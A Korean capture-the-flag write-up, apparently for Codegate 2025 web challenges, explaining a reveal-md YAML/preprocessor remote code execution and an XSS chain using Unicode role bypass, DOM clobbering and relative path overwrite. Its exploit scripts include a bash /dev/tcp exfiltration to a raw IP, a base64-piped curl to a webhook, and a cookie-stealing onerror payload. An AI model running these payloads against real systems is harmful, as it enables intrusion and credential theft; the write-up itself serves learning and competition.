~~함수명이 직관적이라서 분석이 편해요~~

```js
if (state.tag !== null && state.tag !== '!') {
    if (state.tag === '?') {
        ...
    } else if (_hasOwnProperty.call(state.typeMap[state.kind || 'fallback'], state.tag)) {
      type = state.typeMap[state.kind || 'fallback'][state.tag];

      if (state.result !== null && type.kind !== state.kind) {
        throwError(state, 'unacceptable node kind for !<' + state.tag + '> tag; it should be "' + type.kind + '", not "' + state.kind + '"');
      }

      if (!type.resolve(state.result)) { // `state.result` updated in resolver if matched
        throwError(state, 'cannot resolve a node with !<' + state.tag + '> explicit tag');
      } else {
        state.result = type.construct(state.result);
        if (state.anchor !== null) {
          state.anchorMap[state.anchor] = state.result;
        }
      }
    } else {
      throwError(state, 'unknown tag !<' + state.tag + '>');
    }
  }
```

state.tag !== null && `state.tag`는 !== '!' && `state.tag`는 !== '?'이면 두번째 else if로 넘어간다.

`type.construct()`를 실행하므로 RCE가 발생한다. 

야호.

</details>

{::options parse_block_html="false" /}


#### **getPreprocessor**

{: file="node_modules/reveal-md/lib/render.js" }

```js
...
const preprocessorFn = await getPreprocessor(options.preprocessor);
...
```

`getPreprocessor(options.preprocessor)`를 호출한다.

{: file="node_modules/reveal-md/lib/config.js" }

```js
export const getPreprocessor = async preprocessor => {
  if (preprocessor) {
    const { default: defaultFunc } = await import(pathToFileURL(preprocessor));
    return defaultFunc;
  }

  return _.identity;
};
```

임의의 파일을 `import`를 해준다!

① 파일 업로드와 연계하거나 ② options.preprocessor를 덮어서 서버에 존재하는 모듈을 활용한다.

①은 어려워 보인다. 왜냐하면 `*.css`나 `*.md`만 조작할 수 있지만 `import`문으로는 `*.js`나 `*`만 사용할 수 있다.

②를 시도해보자.

```sh
grep -rl "child_process" ./node_modules
```

`open`, `cross-spawn`모듈을 사용할 수 있다. (더 있을 수도)



#### Exploit

`parseYamlFrontMatter`의 파싱 로직을 활용하는 풀이는 출제자이신 `as3617`님의 풀이를 가져왔다.

- 문제가 된다면 삭제하겠습니다.

{::options parse_block_html="true" /}

<details><summary markdown="span">exploit</summary>

{: file="exploit.py" }

```py
import requests
import os
import sys
from pwn import *

USERID = os.urandom(4).hex()
USERPW = os.urandom(4).hex()

HOST = "localhost"
PORT = 80
cookie = None
requests.post("http://"+ HOST + "/auth/register", json={
    "username": USERID, 
    "password": USERPW
})

res = requests.post("http://"+ HOST + "/auth/login", json={
    "username": USERID, 
    "password": USERPW
}, allow_redirects=False)
if (res.headers["Location"] == "/"):
    cookie = res.headers["Set-Cookie"]
else:
    print("fuck")
    sys.exit(1)


p = remote(HOST, PORT)


payload = """{"title":"chacha","highlightTheme":"\\ud800\\u000drevealOptions:\u0020{\\u0022toJSON\\u0022:\\u0020!!js/function \\u0022function \\u005cx28\\u005cx29 {global.process.mainModule.require\\u005cx28\\u005cx27child_process\\u005cx27\\u005cx29.execSync\\u005cx28\\u005cx60bash -c \\u005cx27/readflag\\u005cx3e/dev/tcp/43.200.33.70/1234\\u005cx27\\u005cx60\\u005cx29}\\u0022}","theme":"s"}"""

p.sendline(f"""POST /edit/add/config HTTP/1.1
Host: 43.200.33.70:1234
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: Close
Cookie: {cookie}
Content-Length: {len(payload)}
Content-Type: application/json

{payload}""".replace("\n","\r\n"))
if b"success" in p.recv():
    print("go")


requests.get("http://localhost/view/render",headers={"Cookie":cookie})
```

</details>

{::options parse_block_html="false" /}


내가 푼 `getPreprocessor`와 `cross-spawn` 모듈을 활용하는 풀이이다.

{::options parse_block_html="true" /}

<details><summary markdown="span">exploit</summary>

{: file="exploit.py" }

```py
import requests as req
import base64

# url = 'http://localhost'
url = 'http://3.38.217.181'

asdf = 'faoefjwifwo'
webhook = 'WEBHOOK'
payload = base64.b64encode(f'curl "{webhook}/?q=`/readflag`"'.encode()).decode()
payload = f'echo {payload} | base64 -d | sh'
print(payload)

res = req.post(f'{url}/auth/register', json={'username': asdf, 'password': asdf})

with req.Session() as r:
    res = r.post(f'{url}/auth/login', json={'username': asdf, 'password': asdf})

    res = r.post(f'{url}/edit/add/config', json={'title': 'title', 'theme': '\uD800\rshell: true\rpreprocessor: node_modules/cross-spawn/index.js\r', 'highlightTheme': 'a'})

    res = r.post(f'{url}/edit', json={'markdown': payload})
    
    res = r.get(f'{url}/view/render')
    print(res.text)
```

</details>

{::options parse_block_html="false" /}


**FLAG: `codegate2025{97e237e450c9b45b57bb2a1030ff6ec4d186077c178de0cb451633638f4e7a37}`**



## Upsolving

못 푼 문제가 많아서 아쉽다...

### Masquerade

---

> Keywords: **`XSS`**, **`Relative Path Overwrite`**
{: .prompt-info }

<br>

간단한 XSS였는데 사소한 부분을 놓쳐서 조금만 보고 다른 문제로 넘어가서 못 풀었다.

#### Analysis

{: file="index.js" }

```js
app.use((req, res, next) => {
    const nonce = crypto.randomBytes(16).toString('hex');

    res.setHeader("X-Frame-Options", "deny");

    if (req.path.startsWith('/admin')) {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'self' 'unsafe-inline'`);
    } else {
        res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${nonce}'`);
    }

    res.locals.nonce = nonce;

    next();
});
```

이렇게 CSP가 설정된다.

{: file="models/userModel.js" }

```js
const addUser = (password) => {
    const uuid = uuidv4()

    users.set(uuid, { password, role: "MEMBER", hasPerm: false });

    return uuid;
};
```

addUser를 보면 role과 hasPerm을 관리한다.

하지만 role check 함수가 취약하여 set role에서 우회할 수 있다.

```js
function checkRole(role) {
    const regex = /^(ADMIN|INSPECTOR)$/i;
    return regex.test(role);
}

const setRole = (uuid, input) => {
    const user = getUser(uuid);

    if (checkRole(input)) return false;
    if (!role_list.includes(input.toUpperCase())) return false;

    users.set(uuid, { ...user, role: input.toUpperCase() });

    const updated = getUser(uuid);

    const payload = { uuid, ...updated }

    delete payload.password;

    const token = generateToken(payload);

    return token;
};
```

checkRole에서는 정규식으로 검사하지만, role_list에서는 toUpperCase()로 처리하고, 최종 입력도 toUpperCase()로 처리된다.

[unicode 정규화 트릭](https://lactea.kr/entry/nodejs-unicode)을 활용하면 된다.

<br>

`/post/:post_id`에서 post를 읽을 수 있다.

{: file="views/post/view.ejs" }

```html
...
<body>
    <div class="container">
        <h1 id="post-title">
            <%= post.title %>
        </h1>
        <div class="user-info">
            <button id="report" class="button danger">Report</button>
            <button id="delete" class="button danger">Delete</button>
        </div>

        <hr>
        <div class="post-content">
            <%- post.content %>
        </div>
        <a href="/post" class="button">Go to Posts</a>
    </div>
    <script nonce="<%= nonce %>">
        <% if (isOwner || isAdmin) { %>
            window.conf = window.conf || {
                deleteUrl: "/post/delete/<%= post.post_id %>"
            };
        <% } else { %>
            window.conf = window.conf || {
                deleteUrl: "/error/role"
            };
        <% } %>

        <% if (isInspector) { %>
            window.conf.reportUrl = "/report/<%= post.post_id %>";
        <% } else { %>
            window.conf.reportUrl = "/error/role";
        <% } %>

        const reportButton = document.querySelector("#report");

        reportButton.addEventListener("click", () => {
            location.href = window.conf.reportUrl;
        });

        const deleteButton = document.querySelector("#delete");

        deleteButton.addEventListener("click", () => {
            location.href = window.conf.deleteUrl;
        });
    </script>
</body>

</html>
```

`<%- post.content %>`로 사용하므로 post.content에는 html escape가 적용되지 않는다.

2가지 시나리오가 존재한다

`meta`의 refresh속성으로 다른 페이지로 넘어가거나 or bot이 delete 버튼을 누르는 것을 이용하여 Dom Clobbering을 할 수 있다.

<https://developer.mozilla.org/ko/docs/Web/HTML/Element/meta#http-equiv>

어쨌는 redirect를 할 수 있다.

성공적인 XSS를 위해서는 CSP가 `unsafe-inline`으로 설정된 `/admin/*`으로 가야한다.

{: file="routes/admin.js" }

```js
// TODO : Testing HTML tag functionality for the "/post".
router.get('/test', (req, res) => {
    res.render('admin/test');
});
```

매우 수상한 코드가 있다. 난독화 되어있으니 알아서 난독화 해제해서 보자.

{::options parse_block_html="true" /}

<details><summary markdown="span">원래 views/admin/test.ejs 코드</summary>

{: file="views/admin/test.ejs" }

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Place</title>
</head>

<body>
    <h1 class="post_title"></h1>
    <div class="post_content"></div>
    <div class="error_div"></div>
    <script src="../js/purify.min.js"></script>
    <script>
        function _0x5582(_0x409510, _0xadade8) {
            const _0xed7c16 = _0xf972();
            return _0x5582 = function (_0xe31be7, _0x128541) {
                _0xe31be7 = _0xe31be7 - (0x1b6a + 0x26a * -0xf + 0x9d7);
                let _0x561cef = _0xed7c16[_0xe31be7];
                if (_0x5582['JdbaXF'] === undefined) {
                    var _0x3ec112 = function (_0xb1fd98) {
                        const _0x3e0794 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                        let _0x41f72f = '',
                            _0x58e59d = '';
                        for (let _0x9bab26 = -0x1 * 0xf93 + -0x1 * 0x1fb4 + 0x2f47, _0xe5342b, _0x135544, _0x93f446 = -0x653 + -0x1130 + 0x1783; _0x135544 = _0xb1fd98['charAt'](_0x93f446++); ~_0x135544 && (_0xe5342b = _0x9bab26 % (0x1cad + -0x37 + -0x1c72) ? _0xe5342b * (0x1f32 + -0x17ca + -0x728) + _0x135544 : _0x135544, _0x9bab26++ % (-0x2501 + 0x8e + 0x2477)) ? _0x41f72f += String['fromCharCode'](0x2b3 * 0x1 + -0x1e75 + 0x1b1 * 0x11 & _0xe5342b >> (-(0x1 * -0x1e21 + -0x14 * 0x1e + -0x5 * -0x67f) * _0x9bab26 & 0xada + -0x121e + 0x74a)) : 0x3ae * -0x7 + 0x23c7 + -0x11d * 0x9) {
                            _0x135544 = _0x3e0794['indexOf'](_0x135544);
                        }
                        for (let _0x5f1add = -0x1ff4 + -0x26 * -0xd8 + -0x1c, _0x4fed1c = _0x41f72f['length']; _0x5f1add < _0x4fed1c; _0x5f1add++) {
                            _0x58e59d += '%' + ('00' + _0x41f72f['charCodeAt'](_0x5f1add)['toString'](-0x682 + -0x1631 + 0x1cc3))['slice'](-(0x1 * 0x1c58 + 0x245 + -0x1e9b));
                        }
                        return decodeURIComponent(_0x58e59d);
                    };
                    const _0xee82a5 = function (_0x10768a, _0x497987) {
                        let _0x4887d2 = [],
                            _0x39bfbb = -0x1b93 + -0x8e3 + 0x2476,
                            _0x572c71, _0x35a9ba = '';
                        _0x10768a = _0x3ec112(_0x10768a);
                        let _0x3eb323;
                        for (_0x3eb323 = 0x2e * 0x81 + 0x7a7 * -0x4 + 0x27a * 0x3; _0x3eb323 < 0x34c * 0x8 + -0x7e * 0x5 + 0xb75 * -0x2; _0x3eb323++) {
                            _0x4887d2[_0x3eb323] = _0x3eb323;
                        }
                        for (_0x3eb323 = -0x147 * 0x18 + 0xb * -0x27a + -0x1cf3 * -0x2; _0x3eb323 < -0xa61 * -0x2 + 0x1f * -0x28 + -0xeea; _0x3eb323++) {
                            _0x39bfbb = (_0x39bfbb + _0x4887d2[_0x3eb323] + _0x497987['charCodeAt'](_0x3eb323 % _0x497987['length'])) % (0x8 * -0x2e4 + 0x3b2 * 0x1 + 0x146e), _0x572c71 = _0x4887d2[_0x3eb323], _0x4887d2[_0x3eb323] = _0x4887d2[_0x39bfbb], _0x4887d2[_0x39bfbb] = _0x572c71;
                        }
                        _0x3eb323 = -0x1401 + -0xce9 + 0x20ea, _0x39bfbb = 0x1cb5 + 0xd78 + 0xe0f * -0x3;
                        for (let _0x304253 = -0xecd * 0x2 + -0x765 + 0x24ff; _0x304253 < _0x10768a['length']; _0x304253++) {
                            _0x3eb323 = (_0x3eb323 + (-0x5 * -0x5c7 + -0x2687 + 0x9a5)) % (-0x124d + 0x2f0 * 0x1 + 0x105d), _0x39bfbb = (_0x39bfbb + _0x4887d2[_0x3eb323]) % (-0x1f5b + -0x1 * -0x18c5 + 0x796), _0x572c71 = _0x4887d2[_0x3eb323], _0x4887d2[_0x3eb323] = _0x4887d2[_0x39bfbb], _0x4887d2[_0x39bfbb] = _0x572c71, _0x35a9ba += String['fromCharCode'](_0x10768a['charCodeAt'](_0x304253) ^ _0x4887d2[(_0x4887d2[_0x3eb323] + _0x4887d2[_0x39bfbb]) % (-0x17c5 * 0x1 + -0x1 * -0x16e5 + -0x50 * -0x6)]);
                        }
                        return _0x35a9ba;
                    };
                    _0x5582['ILuJjk'] = _0xee82a5, _0x409510 = arguments, _0x5582['JdbaXF'] = !![];
                }
                const _0x4101fc = _0xed7c16[-0x1 * 0x1881 + -0x194e + 0x31cf],
                    _0x58ab4f = _0xe31be7 + _0x4101fc,
                    _0x190643 = _0x409510[_0x58ab4f];
                return !_0x190643 ? (_0x5582['aHHKWb'] === undefined && (_0x5582['aHHKWb'] = !![]), _0x561cef = _0x5582['ILuJjk'](_0x561cef, _0x128541), _0x409510[_0x58ab4f] = _0x561cef) : _0x561cef = _0x190643, _0x561cef;
            }, _0x5582(_0x409510, _0xadade8);
        }

        function _0xcc04fc(_0x55da2b, _0x27ac54, _0x21bf17, _0x2f99d8, _0x1e7f46) {
            return _0x5582(_0x27ac54 - 0x2de, _0x1e7f46);
        } (function (_0x45a3dd, _0x475e52) {
            function _0x9e4cbc(_0x1471ea, _0x3b5af6, _0xbcb422, _0x2cd57d, _0x484373) {
                return _0x5582(_0x1471ea - -0x3dd, _0xbcb422);
            }
            const _0x1f6db1 = _0x45a3dd();

            function _0x4cdb16(_0x2fdd48, _0x2db694, _0x48da47, _0x32ea3f, _0x5b4320) {
                return _0x5582(_0x48da47 - 0x141, _0x5b4320);
            }

            function _0x344634(_0x1b53f4, _0x8278c0, _0x11aec1, _0x513727, _0x8cdfed) {
                return _0x5582(_0x513727 - -0x2c3, _0x1b53f4);
            }

            function _0x19211e(_0x14566c, _0x241abe, _0xbad1e1, _0x49e8b1, _0x14b1d5) {
                return _0x5582(_0x241abe - 0x170, _0x14b1d5);
            }

            function _0x32f3db(_0x1ed8b3, _0x1b0e0b, _0x1db867, _0x582698, _0x5aac2f) {
                return _0x5582(_0x1ed8b3 - 0x2d5, _0x5aac2f);
            }
            while (!![]) {
                try {
                    const _0x183cdf = parseInt(_0x32f3db(0x3fd, 0x3e7, 0x3f4, 0x3f4, ')1BZ')) / (-0x6c8 + -0x1456 + -0x1 * -0x1b1f) + parseInt(_0x32f3db(0x403, 0x400, 0x405, 0x3ea, 'ynI^')) / (0x141b + 0x2573 + -0xe63 * 0x4) + parseInt(_0x19211e(0x288, 0x296, 0x2a8, 0x281, 'VK3#')) / (0x260a + -0x81f + 0xae * -0x2c) + parseInt(_0x19211e(0x275, 0x28c, 0x29c, 0x27c, 'c#6&')) / (-0x24d6 + -0x1057 * -0x2 + 0x42c) + -parseInt(_0x344634('M1L@', -0x1be, -0x1a8, -0x1b3, -0x1c1)) / (-0x194e + 0x26dd + -0xd8a) + -parseInt(_0x19211e(0x29a, 0x28f, 0x283, 0x280, 'Zq]@')) / (0xdd7 + -0x1e2e + 0x105d) * (parseInt(_0x9e4cbc(-0x2b1, -0x2ac, 'M1L@', -0x2a4, -0x2b3)) / (0x1f7b * 0x1 + 0xc58 + -0x2bcc)) + parseInt(_0x9e4cbc(-0x2b3, -0x2c2, 'yml3', -0x2cc, -0x2a6)) / (0x1df5 * -0x1 + -0x23e5 + 0x41e2) * (-parseInt(_0x32f3db(0x3f6, 0x3fb, 0x40f, 0x3fe, 'r)L!')) / (0x139 * -0x13 + -0x1f7f + 0x1241 * 0x3));
                    if (_0x183cdf === _0x475e52) break;
                    else _0x1f6db1['push'](_0x1f6db1['shift']());
                } catch (_0xd119d7) {
                    _0x1f6db1['push'](_0x1f6db1['shift']());
                }
            }
        }(_0xf972, 0x1f * 0x1281 + 0x6 * 0x17739 + -0x2216 * 0x2b));

        function _0xf972() {
            const _0x11bf3e = ['WQ8vWPlcRZG', 'W43cNaJcQw5FgXC9WP8', 'WQZdJ3K', 'ymk3W6FdLa', 'bCoisJa', 'W4FdHCo9W4i7', 'W4KNW6RdNCoO', 'ruxcHmkU', 'WOZcTCoYW6VcSq', 'BXVdLrJdPq', 'b8oOW7/dPWe', 'WPFcOCo5W5ldNG', 'DrBdVG', 'A8o/AbldQq', 'WR3dHHxcGCo8qsf0pL7dQae', 'W6i8W7e', 'WObOsmoL', 'WPBdGLxdVNG', 'WO3cUSoY', 'WORcSI7cVZe', 'hSoYm0NdGr3dPfJcOtJcUW0', 'WRSoWOpdOcm', 'WPT0dmoYW4G', 'W4aGeq', 'WRddTqRdRK8', 'WPTzAComsq', 'WPRdTCkQWQhdS8kPdSk4W70nAW', 'W6CMW6BdM8o9', 'CHZdRt3cHG', 'WPm7WRe2W6tdRSoj', 'rZ8GjCoo', 'WPbBW7tdRwC', 'gCorWPJcOuLjW7WlCtObnG', 'W7RcMd/cNXvIjfJdOIr7sG', 'W6CQd13cSa', 'W7JcNtZcLHjInxtdTtHyua', 'u8kXWQWDAq', 'ESkRmeRdUCovDSkjqSoa', 'zvLPWQdcOarAFSkBr1SJ', 'sw1BWRH9', 'lh8Awa', 'tSk5WRpcRZW', 'WQVdUMtdJHBcPCkBWP/dLSkjm8os', 'dKWU', 'W70mmCkqhSkBW6rkW5hdVKZdJG', 'WP1pzmootW', 'xmk2WQlcSbCjW557h8kl', 'kmoYCW', 'gmk8yHBcO2tdMq', 'neNcUhBdKvNdHxldMmo0WO1L', 'B11MWQ3cRN9VqCk6ye8', 'xHRdOYhcKq', 'W6NdKmoNdgeZWQZcHIC+', 'W5FdT8kMWOVcN8khW6SXANHbWOO', 'cCoJW6u', 'WRPJyCoaxa', 'WRCoWPNcUdm', 'W5DfW7xdU2e'];
            _0xf972 = function () {
                return _0x11bf3e;
            };
            return _0xf972();
        }
        const post_title = document[_0x353e86('JN58', 0x25b, 0x254, 0x253, 0x270) + _0x353e86(')1BZ', 0x23c, 0x22e, 0x23a, 0x21a) + _0x353e86('F7&0', 0x229, 0x22c, 0x21d, 0x249)](_0x1f95a3('ZInG', 0x471, 0x467, 0x464, 0x46d) + _0x1f95a3('&FD]', 0x45f, 0x453, 0x458, 0x46b) + 'e'),
            post_content = document[_0x353e86('&FD]', 0x21b, 0x230, 0x243, 0x23d) + _0x187b3b(0x8a, 0x90, 0x98, 0x84, 'F7&0') + _0x1f95a3('eFM*', 0x45e, 0x473, 0x487, 0x471)](_0x187b3b(0x87, 0x97, 0x7a, 0x7b, 'O9(7') + _0x20d6d8(0x235, 'eFM*', 0x24a, 0x226, 0x243) + _0x187b3b(0x97, 0x8c, 0x98, 0xa1, 'r)L!')),
            error_div = document[_0x1f95a3('!wy*', 0x46a, 0x44e, 0x466, 0x465) + _0x187b3b(0x8c, 0x74, 0x9f, 0x7b, 'BOp[') + _0x353e86('&FD]', 0x21a, 0x224, 0x216, 0x231)](_0x20d6d8(0x220, 'bYb!', 0x206, 0x20e, 0x21a) + _0x187b3b(0x9f, 0xa7, 0xae, 0x97, ')1BZ'));

        function _0x20d6d8(_0x58a35b, _0x2ba1d3, _0x4889ca, _0x4ad308, _0x40321b) {
            return _0x5582(_0x58a35b - 0x106, _0x2ba1d3);
        }
        const urlSearch = new URLSearchParams(location[_0x1f95a3('eFM*', 0x42e, 0x454, 0x44a, 0x447) + 'h']),
            title = urlSearch[_0x1f95a3('Zq]@', 0x466, 0x451, 0x479, 0x467)](_0xcc04fc(0x3e9, 0x3ed, 0x3f7, 0x3e5, 'L7G1'));

        function _0x353e86(_0x535530, _0x11a0eb, _0x383951, _0x14787a, _0x1c9716) {
            return _0x5582(_0x383951 - 0x119, _0x535530);
        }

        function _0x187b3b(_0x137120, _0x410ff4, _0x523579, _0x4ea266, _0x29a7de) {
            return _0x5582(_0x137120 - -0x94, _0x29a7de);
        }

        function _0x1f95a3(_0x242e4a, _0xdf6e1b, _0x211c27, _0x237ab5, _0x3adc34) {
            return _0x5582(_0x3adc34 - 0x32f, _0x242e4a);
        }
        const content = urlSearch[_0x20d6d8(0x238, 'yml3', 0x23b, 0x250, 0x240)](_0x20d6d8(0x218, '&yJN', 0x201, 0x204, 0x206) + 'nt');
        if (!title && !content) post_content[_0x20d6d8(0x213, 'TlR*', 0x222, 0x205, 0x204) + _0xcc04fc(0x3dc, 0x3ea, 0x400, 0x3f1, ')1BZ')] = _0x187b3b(0x95, 0x90, 0x86, 0x94, ')1BZ') + _0x353e86('#5L]', 0x238, 0x22d, 0x221, 0x229) + _0xcc04fc(0x420, 0x403, 0x3f1, 0x407, '^eE%') + _0xcc04fc(0x421, 0x421, 0x415, 0x425, 'r)L!') + _0x187b3b(0x7d, 0x79, 0x90, 0x6f, '!wy*');
        else try {
            post_title[_0xcc04fc(0x409, 0x41e, 0x415, 0x406, 'yml3') + _0xcc04fc(0x3fe, 0x418, 0x424, 0x423, 'r)L!')] = DOMPurify[_0x187b3b(0xab, 0xc1, 0xbb, 0x93, 'u[jQ') + _0x187b3b(0x93, 0x95, 0x95, 0x7b, 'iZUw')](title), post_content[_0x20d6d8(0x23a, '!wy*', 0x22f, 0x257, 0x246) + _0x20d6d8(0x22a, '$H!J', 0x22f, 0x221, 0x22f)] = DOMPurify[_0x353e86('pTVF', 0x251, 0x25a, 0x267, 0x273) + _0x187b3b(0x7a, 0x5f, 0x87, 0x80, 'pTVF')](content);
        } catch {
            post_title[_0x353e86('nB@I', 0x24d, 0x23c, 0x220, 0x256) + _0x1f95a3('o6ul', 0x474, 0x475, 0x47a, 0x46c)] = title, post_content[_0x20d6d8(0x23b, 'O9(7', 0x240, 0x252, 0x228) + _0x187b3b(0xa5, 0x98, 0xb1, 0x92, 'c#6&')] = content;
        }
    </script>

</html>
```

</details>

{::options parse_block_html="false" /}

근데 신기하게도 실제 풀때는 주석으로 난독화가 풀려 보였다.... ?!?!

Chrome 기능인가...

```html
<script src="../js/purify.min.js"></script>
```

이 부분만 보면 상대 경로를 사용하므로

`/admin/test`가 아닌 `/admin/test/`로 접근하면 RPO로 인하여 `purify.min.js`가 로드되지 않고, try {} catch {}에 잡힌다.

```html
http://localhost:3000/admin/test/?content=<img src=x onerror=alert(1)>
```

와!

그리고 purify에 이상한 값을 넣어서 error를 발생시키는 방법도 있었는데 이 방법은 내가 찾은게 아니라서 공유는 안한다.

#### Exploit

출제자님(Little Stranger)의 풀이이다.

- 문제가 된다면 삭제하겠습니다.

{::options parse_block_html="true" /}

<details><summary markdown="span">exploit</summary>

{: file="exploit.py" }

```py
import requests
import json

url = "http://3.35.104.112:3000"
webhook = "WEBHOOK"

def register(password):
    res = requests.post(f"{url}/auth/register", json={"password": password})
    data = json.loads(res.text)

    return data["uuid"]

def login(uuid, password):
    res = requests.post(f"{url}/auth/login", json={"uuid": uuid, "password": password})
    data = json.loads(res.text)

    return data["token"]

def setRole(role, token):
    res = requests.post(f"{url}/user/role", json={"role": role}, cookies={"jwt": token})
    data = json.loads(res.text)

    return data["token"]

def setPerm(uuid, token):
    requests.post(f"{url}/admin/user/perm", json={"uuid": uuid, "value":True}, cookies={"jwt": token})

def writePost(token):
    res = requests.post(f"{url}/post/write", json={"title": "test", "content": '''
                                                <area id="conf">
                                                <area id="conf" name="deleteUrl" href="/admin/test/?title=dummy&content=<img src=x onerror='location.href=`''' + webhook + '''/${document.cookie}`'>">'''
                                                }, cookies={"jwt": token})
    data = json.loads(res.text)
    return data["post"]["post_id"]

def reportPost(post_id, token):
    res = requests.get(f"{url}/report/{post_id}", cookies={"jwt": token})

    return res.text

password="test"

uuid = register(password)
token = login(uuid, password)
token = setRole("admın", token)
setPerm(uuid, token)
token = setRole("ınspector", token)
token = login(uuid, password)
post_id = writePost(token)
reportPost(post_id + "/", token)
```

</details>

{::options parse_block_html="false" /}

### Hide and Seek

---

> Keywords: **`Blind SSRF leak`**, **`Black Box`**, **`NextJS 1 day`**
{: .prompt-info }

| Description: Play Hide-and-Seek with pretty button!
| ( + I don't know the internal web server's port exactly, but I heard it's "well-known". )


Black Box 좀 빡세다;;;

내부 포트는 808로 브포해야하고, next 1 day를 활용하는 문제이다.

<https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps>

이거 읽으면 풀 수 있다. 

#### Exploit

서버가 닫혀서 다시 못 풀었다.

{::options parse_block_html="true" /}

<details><summary markdown="span">exploit</summary>

{: file="exploit.py" }

```py
츄릅
```

</details>

{::options parse_block_html="false" /}

### 